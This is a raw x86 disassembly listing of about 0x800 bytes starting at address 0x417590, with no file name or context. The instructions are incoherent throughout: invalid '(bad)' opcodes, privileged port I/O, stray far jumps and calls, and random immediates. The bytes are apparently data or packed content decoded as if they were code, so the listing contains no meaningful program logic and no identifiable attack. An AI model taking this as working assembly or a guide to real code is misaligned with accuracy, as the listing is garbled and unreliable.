  417590:	pop    eax
  417591:	or     BYTE PTR [ebx+eax*2+0x1],0xa9
  417596:	leave  
  417597:	push   ebp
  417598:	inc    eax
  417599:	add    al,0xe9
  41759b:	jbe    0x4175cb
  41759d:	push   es
  41759e:	or     dl,BYTE PTR [ecx]
  4175a0:	cld    
  4175a1:	popf   
  4175a2:	pushf  
  4175a3:	lds    edx,FWORD PTR [edx]
  4175a5:	icebp  
  4175a6:	xchg   bl,al
  4175a8:	jmp    0x4175aa
  4175aa:	jns    0x41757f
  4175ac:	mov    ebp,0x32e35807
  4175b1:	inc    esi
  4175b2:	stos   DWORD PTR es:[edi],eax
  4175b3:	scas   al,BYTE PTR es:[edi]
  4175b4:	lock pop ds
  4175b6:	mov    ds:0xd4b4d839,eax
  4175bb:	in     al,dx
  4175bc:	xchg   ebp,eax
  4175bd:	or     BYTE PTR [edi],al
  4175bf:	lods   eax,DWORD PTR ds:[esi]
  4175c0:	and    edi,DWORD PTR [ecx]
  4175c2:	sbb    cl,BYTE PTR [esi-0xea2411c]
  4175c8:	pop    esp
  4175c9:	sbb    dh,BYTE PTR [eax+0x6436234f]
  4175cf:	mov    ds:0xe984ca81,eax
  4175d4:	in     al,0x29
  4175d6:	jle    0x41755c
  4175d8:	test   BYTE PTR [di-0x534c],bl
  4175dd:	fnsave [eax]
  4175df:	cmp    DWORD PTR [ebx],edi
  4175e1:	pop    esi
  4175e2:	ins    DWORD PTR es:[edi],dx
  4175e3:	(bad)  
  4175e4:	jns    0x4175b3
  4175e6:	icebp  
  4175e7:	push   ds
  4175e8:	jl     0x41759e
  4175ea:	das    
  4175eb:	in     eax,dx
  4175ec:	adc    ebp,esi
  4175ee:	xchg   edx,eax
  4175ef:	int    0xd5
  4175f1:	das    
  4175f2:	inc    esp
  4175f3:	mov    es,WORD PTR [eax-0x18]
  4175f6:	out    0x2b,al
  4175f8:	sbb    al,0xce
  4175fa:	fidivr DWORD PTR [esi]
  4175fc:	inc    ebp
  4175fd:	fistp  WORD PTR [ecx+0x1d]
  417600:	sub    bh,BYTE PTR [esi+0x543d1a00]
  417606:	jo     0x41759a
  417608:	stc    
  417609:	iret   
  41760a:	retf   0x662e
  41760d:	xchg   BYTE PTR [edi+0x49],ah
  417610:	jg     0x417668
  417612:	ret    0xed89
  417615:	sbb    edi,DWORD PTR [eax]
  417617:	je     0x4175cf
  417619:	not    BYTE PTR [ecx]
  41761b:	fmul   st,st(6)
  41761d:	sbb    al,0xa8
  41761f:	cmp    ebp,ebp
  417621:	jne    0x41764e
  417623:	in     al,dx
  417624:	pop    ebx
  417625:	jl     0x417639
  417627:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417628:	mov    al,ds:0xb8035846
  41762d:	enter  0xedf4,0x2a
  417631:	neg    BYTE PTR [ecx]
  417633:	rcr    DWORD PTR [eax],cl
  417635:	pop    esi
  417636:	mov    esi,0x4d9352a1
  41763b:	call   0x69d00f
  417640:	std    
  417641:	and    DWORD PTR [edi+0x3b],ebx
  417644:	add    edi,DWORD PTR [esi]
  417646:	jae    0x4175fc
  417648:	(bad)  
  417649:	fsub   st(4),st
  41764b:	sub    eax,DWORD PTR [edx+edx*1]
  41764e:	in     eax,0x8b
  417650:	cmp    DWORD PTR [edx-0xcd7c19e],eax
  417656:	cmp    eax,0xa84ca22f
  41765b:	jp     0x41761b
  41765d:	mov    esi,0xcbe77d52
  417662:	out    dx,al
  417663:	ss jp  0x417689
  417666:	aad    0x2
  417668:	jno    0x41767f
  41766a:	cmc    
  41766b:	cmp    DWORD PTR [esi+0x20dd5167],edi
  417671:	pop    ecx
  417672:	aad    0x30
  417674:	xor    bl,BYTE PTR [esi]
  417676:	cld    
  417677:	pop    ss
  417678:	mov    esi,0x4a20216d
  41767d:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41767f:	nop
  417680:	arpl   WORD PTR [esi+0x69],si
  417683:	adc    DWORD PTR [eax],ecx
  417685:	sbb    DWORD PTR [esi+ecx*1+0x7e],edi
  417689:	jge    0x4176d1
  41768b:	xchg   edi,eax
  41768c:	xlat   BYTE PTR ds:[ebx]
  41768d:	inc    esp
  41768e:	xor    cl,bh
  417690:	pop    ss
  417691:	jo     0x41770e
  417693:	cdq    
  417694:	(bad)  
  417696:	leave  
  417697:	rcr    BYTE PTR [edx+0x52050775],cl
  41769d:	xor    eax,0x4189d945
  4176a2:	mov    eax,0x21abe030
  4176a7:	mov    al,ds:0x8a2f495
  4176ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4176ad:	cmc    
  4176ae:	push   edi
  4176af:	ror    DWORD PTR [edx+ebp*2],0x38
  4176b3:	sbb    al,0xfe
  4176b5:	neg    DWORD PTR [ebp-0x725ea82a]
  4176bb:	fcom   DWORD PTR [esi+0x1f]
  4176be:	mov    bh,0xc3
  4176c0:	mov    WORD PTR [ecx-0x1f],?
  4176c3:	sub    ch,al
  4176c5:	jp     0x4176f8
  4176c7:	pcmpeqw mm1,QWORD PTR [ecx-0xa]
  4176cb:	in     al,0xb7
  4176cd:	jle    0x417744
  4176cf:	test   DWORD PTR [edx],0x13bcc9db
  4176d5:	retf   
  4176d6:	arpl   WORD PTR [edx-0x68e192b4],ax
  4176dc:	stc    
  4176dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4176de:	mov    al,0x45
  4176e0:	add    al,BYTE PTR [esi-0x62]
  4176e3:	or     eax,0xcb47232
  4176e8:	cli    
  4176e9:	cld    
  4176ea:	cmp    ch,0x74
  4176ed:	push   cs
  4176ee:	inc    eax
  4176ef:	outs   dx,BYTE PTR ds:[esi]
  4176f0:	push   esi
  4176f1:	pop    edx
  4176f2:	fiadd  WORD PTR [edx]
  4176f4:	jmp    0x417762
  4176f6:	cmp    ebp,edi
  4176f8:	push   0x9896ea1
  4176fd:	cmp    ch,BYTE PTR [edx]
  4176ff:	into   
  417700:	dec    edi
  417701:	dec    ecx
  417702:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417703:	outs   dx,DWORD PTR ds:[esi]
  417704:	jne    0x4176b4
  417706:	sbb    al,0x34
  417708:	add    ebx,DWORD PTR [edx]
  41770a:	mov    ebx,0xa20f62aa
  41770f:	adc    ah,BYTE PTR [edi]
  417711:	xor    al,0x4a
  417713:	jl     0x417739
  417715:	scas   al,BYTE PTR es:[edi]
  417716:	mov    esp,0xa4689df4
  41771b:	(bad)  
  41771c:	ja     0x417776
  41771e:	sti    
  41771f:	hlt    
  417720:	stos   BYTE PTR es:[edi],al
  417721:	jp     0x4176fe
  417723:	xchg   edx,eax
  417724:	stc    
  417725:	cmp    DWORD PTR [eax+0x3d0e5968],0xffffff98
  41772c:	ins    DWORD PTR es:[edi],dx
  41772d:	sar    BYTE PTR [ecx+ebp*2],1
  417730:	call   0xc3a2:0xdc492e2e
  417737:	cmp    eax,0x697ddd82
  41773c:	xchg   edi,eax
  41773d:	repz shl DWORD PTR [edx+0x2b],1
  417741:	jno    0x4176f7
  417743:	outs   dx,DWORD PTR ds:[esi]
  417744:	add    DWORD PTR [ecx-0x43],ebx
  417747:	dec    ecx
  417748:	sbb    BYTE PTR [eax],cl
  41774a:	dec    ebp
  41774b:	out    dx,eax
  41774c:	pop    edi
  41774d:	push   ds
  41774e:	fsubr  DWORD PTR [esi]
  417750:	push   0xb73f27d1
  417755:	push   ecx
  417756:	fs push 0xceda42a4
  41775c:	xor    ah,BYTE PTR [edi+0xc]
  41775f:	lea    eax,[edx]
  417761:	into   
  417762:	mul    BYTE PTR [esi*1-0x28dcc945]
  417769:	neg    BYTE PTR [edx-0x51]
  41776c:	push   0xbc41f7e4
  417771:	push   esp
  417772:	fwait
  417773:	and    DWORD PTR [ebx-0x31f1ea6],eax
  417779:	add    edx,DWORD PTR [ebp+0x76]
  41777c:	mov    esi,0xcafb224a
  417781:	xor    bl,al
  417783:	add    cl,BYTE PTR [ecx]
  417785:	jne    0x41774b
  417787:	lds    ebp,FWORD PTR [esi+0x74]
  41778a:	xchg   BYTE PTR [ebx+0xe9c8e0b],ah
  417790:	mov    ecx,0x744a4086
  417795:	cmp    al,0x37
  417797:	jmp    0x417787
  417799:	cmp    BYTE PTR [ecx+0x69],bl
  41779c:	dec    edi
  41779d:	and    edi,0xbc2d6f9c
  4177a3:	lds    edx,FWORD PTR [eax+0x15]
  4177a6:	mov    esi,DWORD PTR [edx+0x4a5d95a3]
  4177ac:	int3   
  4177ad:	fld    TBYTE PTR [ecx+ebp*2]
  4177b0:	xor    al,0x13
  4177b2:	jb     0x417749
  4177b4:	retf   
  4177b5:	in     eax,dx
  4177b6:	sbb    al,0x77
  4177b8:	xor    DWORD PTR [ebp+0x5d60a82c],eax
  4177be:	sbb    eax,0xaa564875
  4177c3:	out    dx,eax
  4177c4:	(bad)  
  4177c5:	imul   esp,DWORD PTR [esi-0x1],0x8964f24c
  4177cc:	aad    0xd0
  4177ce:	inc    ebp
  4177cf:	add    cl,ah
  4177d1:	and    al,0x4b
  4177d3:	fist   DWORD PTR [edi+0x15624cee]
  4177d9:	hlt    
  4177da:	mov    al,0x4
  4177dc:	rcr    BYTE PTR [eax],1
  4177de:	xchg   ebp,eax
  4177df:	jecxz  0x417804
  4177e1:	shl    BYTE PTR [edx+0x2f],0x5e
  4177e5:	stos   DWORD PTR es:[edi],eax
  4177e6:	push   ebx
  4177e7:	imul   esp,DWORD PTR [ebx+0x61],0x30ddbc07
  4177ee:	dec    ebp
  4177ef:	pop    edx
  4177f0:	ret    
  4177f1:	jle    0x41778f
  4177f3:	xor    eax,0x5b17d1f5
  4177f8:	lods   eax,DWORD PTR ds:[esi]
  4177f9:	lods   al,BYTE PTR ds:[esi]
  4177fa:	stos   DWORD PTR es:[edi],eax
  4177fb:	cmp    ebx,DWORD PTR [ecx-0x3e]
  4177fe:	sub    eax,edi
  417800:	call   0x874c71c7
  417805:	dec    edx
  417806:	mov    esp,0x158f641e
  41780b:	or     eax,0x61150d20
  417810:	arpl   WORD PTR [ecx-0x1d],bx
  417813:	ror    DWORD PTR [esi+0x52],1
  417816:	out    dx,al
  417817:	outs   dx,BYTE PTR ds:[esi]
  417818:	rcl    BYTE PTR [ebp-0x1e],cl
  41781b:	outs   dx,DWORD PTR ds:[esi]
  41781c:	push   ebp
  41781d:	out    0xa3,al
  41781f:	ds and eax,0x3ef097ce
  417825:	fcom   st(4)
  417827:	jp     0x4177ba
  417829:	adc    dl,ch
  41782b:	sub    BYTE PTR [edx],ch
  41782d:	mov    ebx,0x9060e0e7
  417832:	popf   
  417833:	and    ah,bl
  417835:	outs   dx,BYTE PTR ds:[esi]
  417836:	lea    eax,[ecx+0x2165d1a1]
  41783c:	lods   al,BYTE PTR ds:[esi]
  41783d:	inc    esp
  41783e:	mov    esp,0x88429612
  417843:	mov    eax,0x47a982ef
  417849:	ret    
  41784a:	ds (bad) 
  41784c:	mov    eax,DWORD PTR [edi-0x10]
  41784f:	cmp    BYTE PTR [ebx+eax*1+0x7de9c5b6],0xc6
  417857:	je     0x41787e
  417859:	outs   dx,BYTE PTR ds:[esi]
  41785a:	and    BYTE PTR [ebx-0x2b],dh
  41785d:	repz add eax,0x4f747089
  417863:	mov    ebp,0xacfeab9b
  417868:	data16 mov bh,0x5d
  41786b:	aad    0xdf
  41786d:	push   eax
  41786e:	daa    
  41786f:	or     eax,0x650cee23
  417874:	sub    edi,DWORD PTR [esi]
  417876:	jge    0x41784d
  417878:	cdq    
  417879:	or     DWORD PTR [ebp-0x32740640],ebx
  41787f:	daa    
  417880:	add    eax,0x62c3e361
  417885:	push   edx
  417886:	retf   
  417887:	out    0xba,al
  417889:	div    DWORD PTR [esi-0x56]
  41788c:	in     eax,dx
  41788d:	xor    ch,BYTE PTR [ebx+0x7f1a794a]
  417893:	sbb    eax,0x46460ecc
  417898:	or     DWORD PTR [edi-0x15cf55b1],ebp
  41789e:	and    dh,BYTE PTR [ecx]
  4178a0:	out    0x27,al
  4178a2:	inc    eax
  4178a3:	xor    DWORD PTR [ecx+0x79],0xffffff92
  4178a7:	jae    0x417913
  4178a9:	shr    bl,0xcb
  4178ac:	sbb    al,ah
  4178ae:	jg     0x417894
  4178b0:	sbb    eax,0x2cc0420f
  4178b5:	dec    edx
  4178b6:	das    
  4178b7:	in     eax,dx
  4178b8:	mul    bl
  4178ba:	(bad)  
  4178bb:	jmp    0x53df:0x86eee563
  4178c2:	sub    eax,0x7a2f3df7
  4178c7:	stos   BYTE PTR es:[edi],al
  4178c8:	out    0xb6,eax
  4178ca:	repz mov esi,0x4cf09bc2
  4178d0:	aad    0x4f
  4178d2:	dec    esp
  4178d3:	cmp    BYTE PTR [eax+ebp*8+0x60],bl
  4178d7:	mov    bh,0xb9
  4178d9:	data16 sbb bl,0x8d
  4178dd:	jno    0x417884
  4178df:	aad    0x1c
  4178e1:	mov    ss,WORD PTR [edx+0x57853fe9]
  4178e7:	mov    edx,0x36f08372
  4178ec:	jmp    0x72a3:0x352a74be
  4178f3:	fwait
  4178f4:	xchg   edx,eax
  4178f5:	mov    bh,0x84
  4178f7:	(bad)  
  4178f8:	sbb    eax,0x287ec179
  4178fd:	lock lods al,BYTE PTR ds:[esi]
  4178ff:	aaa    
  417900:	mov    ebx,0x8d29d253
  417905:	xchg   esp,eax
  417906:	stos   BYTE PTR es:[edi],al
  417907:	out    0xd8,al
  417909:	stos   DWORD PTR es:[edi],eax
  41790a:	xor    ecx,DWORD PTR [edi-0x7e2aa14b]
  417910:	xor    esp,DWORD PTR [edi+0x14a9f1a3]
  417916:	jno    0x4178c9
  417918:	mov    edi,0xb2f77f2c
  41791d:	xor    al,BYTE PTR [ebp-0x4a]
  417920:	jnp    0x41797c
  417922:	stc    
  417923:	ins    DWORD PTR es:[edi],dx
  417924:	inc    esi
  417925:	int    0xe0
  417927:	mov    edx,0x2e0f0b53
  41792c:	dec    eax
  41792d:	mov    DWORD PTR cs:[ebx-0x3c4276c2],ebp
  417934:	aas    
  417935:	fs in  eax,dx
  417937:	sar    BYTE PTR [esi+0x14],1
  41793a:	push   ds
  41793b:	in     al,0x3b
  41793d:	lea    esp,ds:0x5fac4ad7
  417943:	pop    edx
  417944:	ja     0x417966
  417946:	push   edx
  417947:	gs jb  0x46823ab7
  41794e:	jl     0x4178eb
  417950:	pop    ebp
  417951:	dec    ebp
  417952:	or     DWORD PTR [edi],edx
  417954:	test   al,0xfb
  417956:	jmp    0x4179a9
  417958:	aad    0xbf
  41795a:	xchg   ecx,eax
  41795b:	mov    bl,0x2
  41795d:	lds    esp,FWORD PTR [ecx+ecx*8]
  417960:	ss jl  0x41794e
  417963:	stos   DWORD PTR es:[edi],eax
  417964:	je     0x417900
  417966:	xor    al,0xb4
  417968:	(bad)  
  417969:	mov    ebx,DWORD PTR [edx-0x10]
  41796c:	push   es
  41796d:	push   ds
  41796e:	(bad)  
  41796f:	sub    ah,dl
  417971:	(bad)
  417974:	mov    BYTE PTR [esi+ebx*2],0xbb
  417978:	rcr    BYTE PTR [edi-0x49],cl
  41797b:	push   ebp
  41797c:	inc    eax
  41797d:	inc    edi
  41797e:	push   0x6d
  417980:	cmp    edi,DWORD PTR [ebx+0x36]
  417983:	or     eax,0x7d8a2da9
  417988:	daa    
  417989:	(bad)  
  41798a:	and    esi,DWORD PTR [esp+eiz*4]
  41798d:	mov    eax,DWORD PTR ds:0xda5c00c4
  417993:	dec    ecx
  417994:	dec    edi
  417995:	daa    
  417996:	push   cs
  417997:	jmp    0xef0f022b
  41799c:	sbb    dl,BYTE PTR [edi]
  41799e:	test   al,0x61
  4179a0:	ds test eax,0xcd7c956b
  4179a6:	call   0x168b:0x515e3188
  4179ad:	shl    ebp,1
  4179af:	(bad)  
  4179b0:	retf   0xe504
  4179b3:	jge    0x417a2f
  4179b5:	mov    ah,0x41
  4179b7:	shr    BYTE PTR [edx+0x74060190],cl
  4179bd:	sub    al,bh
  4179bf:	sti    
  4179c0:	inc    eax
  4179c1:	jne    0x4179fa
  4179c3:	add    al,0x6
  4179c5:	rol    edx,1
  4179c7:	out    dx,al
  4179c8:	sbb    BYTE PTR [edi+0x691b9355],0x9a
  4179cf:	sbb    bl,BYTE PTR [edi]
  4179d1:	lock ss in eax,dx
  4179d4:	lea    edx,[ebp+0x5f]
  4179d7:	test   eax,0x23c4e4af
  4179dc:	icebp  
  4179dd:	mov    ds:0x55a7c007,eax
  4179e2:	add    eax,0x54b6debf
  4179e7:	xor    edi,ebp
  4179e9:	je     0x417a40
  4179eb:	inc    BYTE PTR [eax+0xf1e3c6d]
  4179f1:	imul   ecx,DWORD PTR [edi],0x7501db3d
  4179f7:	pusha  
  4179f8:	in     eax,0xa1
  4179fa:	jno    0x4179b5
  4179fc:	aas    
  4179fd:	mov    edi,0x6d957ac0
  417a02:	xor    eax,0xfb99c853
  417a07:	cdq    
  417a08:	retf   
  417a09:	sar    BYTE PTR [esi+0x135d14d7],0xad
  417a10:	and    cl,BYTE PTR [ebp-0xc117a9e]
  417a16:	arpl   WORD PTR [edx],bp
  417a18:	xchg   ecx,eax
  417a19:	mov    fs,WORD PTR [esi+0x3b]
  417a1c:	mov    BYTE PTR [eax-0xd],bh
  417a1f:	jne    0x4179d7
  417a21:	mov    edx,0xd91ad983
  417a26:	aad    0x81
  417a28:	add    ch,0x9f
  417a2b:	and    eax,0x63bfa8f6
  417a30:	clc    
  417a31:	stos   DWORD PTR es:[edi],eax
  417a32:	cld    
  417a33:	hlt    
  417a34:	mov    bl,0x59
  417a36:	pop    es
  417a37:	mov    eax,0x1dcddbd2
  417a3c:	not    dh
  417a3e:	loope  0x417a0d
  417a40:	cmp    cl,BYTE PTR [edi]
  417a42:	push   0x3be44f34
  417a47:	adc    al,0xd5
  417a49:	xchg   DWORD PTR [ecx],esp
  417a4b:	fnstenv [esi+0x14]
  417a4e:	dec    DWORD PTR [esi]
  417a50:	mov    al,ds:0x1d755bdf
  417a55:	lea    ecx,[ecx]
  417a57:	imul   edx,DWORD PTR [ecx],0xffffffb4
  417a5a:	fisttp QWORD PTR [edx-0x60d38b4c]
  417a60:	sub    al,0xa3
  417a62:	xchg   ecx,eax
  417a63:	fdiv   QWORD PTR [edi]
  417a65:	mov    DWORD PTR [ebx],edx
  417a67:	xbegin 0x4b66114d
  417a6d:	pop    eax
  417a6e:	ror    DWORD PTR [edi],1
  417a70:	xchg   ecx,eax
  417a71:	jg     0x417abc
  417a73:	fcompp 
  417a75:	add    eax,0x944ad08a
  417a7a:	xchg   edx,eax
  417a7b:	imul   eax,DWORD PTR [ecx+0x6e],0xbf1ea6bd
  417a82:	add    bh,BYTE PTR [ebp+0x95d699c]
  417a88:	mov    al,0x86
  417a8a:	inc    eax
  417a8b:	adc    BYTE PTR [ebx-0x124f62a9],al
  417a91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a92:	shr    DWORD PTR [edx-0x58e8584b],cl
  417a98:	sub    al,BYTE PTR [eax]
  417a9a:	aas    
  417a9b:	mov    ds:0x87b7f851,al
  417aa0:	adc    al,0xb5
  417aa2:	pop    edi
  417aa3:	sub    al,0xfe
  417aa5:	les    eax,FWORD PTR [ebp+0x75386d5f]
  417aab:	dec    ebp
  417aac:	jle    0x417a95
  417aae:	mov    bh,0x86
  417ab0:	mov    eax,0xe9a8cb21
  417ab5:	dec    esi
  417ab6:	fdiv   DWORD PTR es:[edi+0x53d9b482]
  417abd:	push   ss
  417abe:	scas   eax,DWORD PTR es:[edi]
  417abf:	pop    esp
  417ac0:	cmp    al,0xe3
  417ac2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ac3:	dec    edx
  417ac4:	fwait
  417ac5:	mov    bh,0xaa
  417ac7:	je     0x417afd
  417ac9:	push   ecx
  417aca:	adc    esi,DWORD PTR [esi+0x5c]
  417acd:	ins    DWORD PTR es:[edi],dx
  417ace:	cli    
  417acf:	fnstsw WORD PTR [ebx+0xd2d553b]
  417ad5:	test   BYTE PTR [edx+0x59],dl
  417ad8:	mov    cs,edi
  417ada:	and    DWORD PTR [esi+0x60],0x76
  417ade:	dec    eax
  417adf:	cmp    BYTE PTR [eax-0x694269e5],bl
  417ae5:	mov    bh,0xbf
  417ae7:	adc    bl,BYTE PTR [esi]
  417ae9:	pop    ebp
  417aea:	fsubr  st,st(3)
  417aec:	jae    0x417ae7
  417aee:	ja     0x417b25
  417af0:	and    esi,0x324ba9a7
  417af6:	jmp    0xf5ee567a
  417afb:	and    dl,bl
  417afd:	jb     0x417a85
  417aff:	retf   0xf942
  417b02:	jmp    0xfe3d:0x31418568
  417b09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b0a:	js     0x417ac0
  417b0c:	xor    al,0x46
  417b0e:	xor    ch,bl
  417b10:	call   0x1235a035
  417b15:	adc    DWORD PTR ss:[esi-0x2e8ec6b],eax
  417b1c:	in     al,dx
  417b1d:	and    dl,BYTE PTR [ebx+0x550e9e26]
  417b23:	fld    DWORD PTR [ebx+0x77]
  417b26:	mov    ecx,0xec54f97f
  417b2b:	out    0xbd,al
  417b2d:	xchg   DWORD PTR [ecx-0x7172ca35],esp
  417b33:	xor    eax,0x712e1f32
  417b38:	or     DWORD PTR [ebx],esp
  417b3a:	or     al,0x1c
  417b3c:	fstp   st(3)
  417b3e:	and    DWORD PTR [ecx-0x75df23e4],edi
  417b44:	jne    0x417b7d
  417b46:	dec    ebp
  417b47:	or     DWORD PTR [ebx+0x4e36be76],ebp
  417b4d:	inc    ebp
  417b4e:	adc    al,0xa6
  417b50:	pusha  
  417b51:	(bad)  
  417b53:	(bad)  
  417b54:	mov    dh,0xf1
  417b56:	sub    esi,DWORD PTR [ebp+0x19abb58f]
  417b5c:	cmp    BYTE PTR [edx+0x2f2081a7],bh
  417b62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b63:	push   es
  417b64:	call   0x586078a4
  417b69:	nop
  417b6a:	jo     0x417bc5
  417b6c:	add    BYTE PTR [ebx],dh
  417b6e:	xor    BYTE PTR [edi],bl
  417b70:	loopne 0x417b10
  417b72:	add    edi,ebx
  417b74:	sbb    DWORD PTR [ebx+0x31],0x48
  417b78:	in     al,0x77
  417b7a:	or     bh,BYTE PTR [ecx+esi*2+0x1f]
  417b7e:	in     eax,dx
  417b7f:	mov    ebx,0x1937920b
  417b84:	inc    ebx
  417b85:	xor    edi,DWORD PTR [ecx+ecx*8+0x2d]
  417b89:	leave  
  417b8a:	mov    fs,WORD PTR [ecx]
  417b8c:	push   es
  417b8d:	imul   esp,DWORD PTR [ecx+eax*1-0x41c78239],0x7e
  417b95:	inc    ecx
  417b96:	aas    
  417b97:	clc    
  417b98:	ror    DWORD PTR ds:0xd105c458,0x5c
  417b9f:	add    al,BYTE PTR [esi]
  417ba1:	xchg   esi,eax
  417ba2:	cmp    ebx,ebp
  417ba4:	sub    cl,BYTE PTR [ebx-0x6b]
  417ba7:	addr16 das 
  417ba9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417baa:	fwait
  417bab:	jbe    0x417ba5
  417bad:	sbb    ch,al
  417baf:	or     BYTE PTR [ebx+0x7d1c17dd],ah
  417bb5:	push   esi
  417bb6:	pop    edi
  417bb7:	push   ecx
  417bb8:	sub    BYTE PTR [eax],0xc5
  417bbb:	icebp  
  417bbc:	jg     0x417c1f
  417bbe:	push   0x79
  417bc0:	test   eax,0x679c8cc5
  417bc5:	cmc    
  417bc6:	mov    ebp,DWORD PTR [ebp-0x56918106]
  417bcc:	call   0xcf2482a9
  417bd1:	add    DWORD PTR [ecx+0x2c9d61ec],edi
  417bd7:	mov    WORD PTR [ecx+0x42],?
  417bda:	add    bl,BYTE PTR [edi-0xee1ebb2]
  417be0:	stos   DWORD PTR es:[edi],eax
  417be1:	into   
  417be2:	sub    al,0x41
  417be4:	cmp    ebp,ebp
  417be6:	push   esi
  417be7:	adc    DWORD PTR [edx+0x4],edi
  417bea:	outs   dx,BYTE PTR ds:[esi]
  417beb:	arpl   WORD PTR gs:[esi+0x5a6efa82],bx
  417bf2:	and    ebx,ecx
  417bf4:	or     al,0xe6
  417bf6:	xor    edx,esi
  417bf8:	ror    BYTE PTR [ebx-0x10],cl
  417bfb:	inc    ecx
  417bfc:	adc    eax,0xd3c7a815
  417c01:	ret    
  417c02:	ins    BYTE PTR es:[edi],dx
  417c03:	push   cs
  417c04:	adc    ecx,DWORD PTR [edi]
  417c06:	retf   
  417c07:	dec    edx
  417c08:	fstp   st(1)
  417c0a:	fmul   QWORD PTR [ebx+0x5e]
  417c0d:	adc    edi,DWORD PTR [eax+0x78e0be9d]
  417c13:	dec    ecx
  417c14:	leave  
  417c15:	(bad)  
  417c16:	int    0x64
  417c18:	stos   DWORD PTR es:[edi],eax
  417c19:	iret   
  417c1a:	call   FWORD PTR [eax-0x28be696c]
  417c20:	in     al,dx
  417c21:	fild   QWORD PTR [eax]
  417c23:	dec    ebp
  417c24:	nop
  417c25:	xor    DWORD PTR [ebp-0x2e5dffbc],0xc07c56af
  417c2f:	or     esi,0x71a2c50c
  417c35:	(bad)  
  417c36:	sbb    dl,BYTE PTR [ebp+0x6b]
  417c39:	out    0x5d,al
  417c3b:	rcl    DWORD PTR [edx],1
  417c3d:	dec    ebp
  417c3e:	mov    ah,0x29
  417c40:	pop    edx
  417c41:	push   esi
  417c42:	fbld   TBYTE PTR [edi+0x42]
  417c45:	ss sbb eax,0xf4eab126
  417c4b:	(bad)  
  417c4c:	out    0x3d,al
  417c4e:	cmp    DWORD PTR [ecx+0x3c9b6857],esi
  417c54:	stc    
  417c55:	pop    ds
  417c56:	xor    eax,0x6914be81
  417c5b:	inc    ebx
  417c5c:	pop    ebx
  417c5d:	mov    ds:0xccf72794,al
  417c62:	data16 cmp BYTE PTR ss:[esi-0x5aafaa49],bl
  417c6a:	mov    WORD PTR [edi],?
  417c6c:	xlat   BYTE PTR ds:[ebx]
  417c6d:	mov    dh,0x29
  417c6f:	jae    0x417c71
  417c71:	enter  0x8d30,0x11
  417c75:	out    dx,eax
  417c76:	add    DWORD PTR [ecx-0x615dc2d3],edi
  417c7c:	mov    ebx,0x67e8f8b0
  417c81:	jb     0x417c64
  417c83:	in     eax,0xb
  417c85:	jg     0x417c8d
  417c87:	pop    es
  417c88:	fs add ah,dh
  417c8b:	sub    esp,DWORD PTR [edi+ecx*8]
  417c8e:	xlat   BYTE PTR ds:[ebx]
  417c8f:	js     0x417c71
  417c91:	and    eax,0x5a29ecc3
  417c96:	jbe    0x417c68
  417c98:	shl    BYTE PTR [edx+ecx*2],0xda
  417c9c:	or     ch,dh
  417c9e:	hlt    
  417c9f:	dec    BYTE PTR [eax+0x3ef75b2c]
  417ca5:	and    BYTE PTR ds:0x8080df5,dl
  417cab:	pop    ecx
  417cac:	repz cmc 
  417cae:	call   0xf4df:0x985c1b9a
  417cb5:	stos   BYTE PTR es:[edi],al
  417cb6:	int    0xcb
  417cb8:	lea    edi,[ebx-0x30a02548]
  417cbe:	sar    BYTE PTR [ebp+0x312794fb],cl
  417cc4:	outs   dx,BYTE PTR ds:[esi]
  417cc5:	fistp  WORD PTR [ebp+0x227d6ed3]
  417ccb:	out    0xb2,al
  417ccd:	int3   
  417cce:	sub    ecx,DWORD PTR [esi+eax*2-0x1e]
  417cd2:	std    
  417cd3:	retf   
  417cd4:	leave  
  417cd5:	popf   
  417cd6:	push   ss
  417cd7:	fsubrp st(5),st
  417cd9:	xchg   DWORD PTR [ecx-0x5b38e0e7],ebp
  417cdf:	ins    BYTE PTR es:[edi],dx
  417ce0:	es pop edi
  417ce2:	pop    ebp
  417ce3:	add    edx,eax
  417ce5:	in     eax,0xa
  417ce7:	scas   al,BYTE PTR es:[edi]
  417ce8:	je     0x417d4a
  417cea:	jp     0x417ccd
  417cec:	stos   DWORD PTR es:[edi],eax
  417ced:	es jmp 0x8790:0x830cba27
  417cf5:	sbb    dh,BYTE PTR [eax-0x40]
  417cf8:	add    al,0x3c
  417cfa:	sbb    DWORD PTR [eax+0x2f],edi
  417cfd:	xor    BYTE PTR [ebx+0x437a068],cl
  417d03:	dec    ecx
  417d04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d05:	push   esp
  417d06:	(bad)  
  417d07:	jp     0x417cfb
  417d09:	lods   eax,DWORD PTR ds:[esi]
  417d0a:	adc    BYTE PTR [ecx-0x7d1f85eb],0x86
  417d11:	xchg   esp,eax
  417d12:	in     eax,dx
  417d13:	dec    esi
  417d14:	shr    BYTE PTR [edi+ebp*2+0x8b04c38],cl
  417d1b:	xor    DWORD PTR [eax+0x2ed7d8bc],edi
  417d21:	add    eax,0x9b214976
  417d26:	dec    edi
  417d27:	mov    dl,0xbc
  417d29:	mov    cl,0x52
  417d2b:	lds    edi,FWORD PTR [edi]
  417d2d:	mov    dh,0x16
  417d2f:	sbb    esi,DWORD PTR [edx]
  417d31:	outs   dx,BYTE PTR ds:[esi]
  417d32:	sub    al,0xe5
  417d34:	(bad)  
  417d35:	sbb    eax,0x248ca75f
  417d3a:	imul   ebp,DWORD PTR [edi],0x17
  417d3d:	or     BYTE PTR [edi-0x72],bl
  417d40:	mov    dl,0xe8
  417d42:	cmp    BYTE PTR [ebx-0x4c997181],0x70
  417d49:	xchg   dl,dl
  417d4b:	add    eax,0x49062526
  417d50:	or     eax,0xa4f55bd8
  417d55:	xor    bl,BYTE PTR [ebx+0xc087ceb]
  417d5b:	out    dx,al
  417d5c:	shl    BYTE PTR cs:[ebx+0x3a],0xb5
  417d61:	pminub mm1,QWORD PTR [ebp+ebp*4+0x5335654e]
  417d69:	sub    al,0x89
  417d6b:	loop   0x417dd8
  417d6d:	gs jmp 0x4efb:0x1f88b91
  417d75:	in     al,0xb7
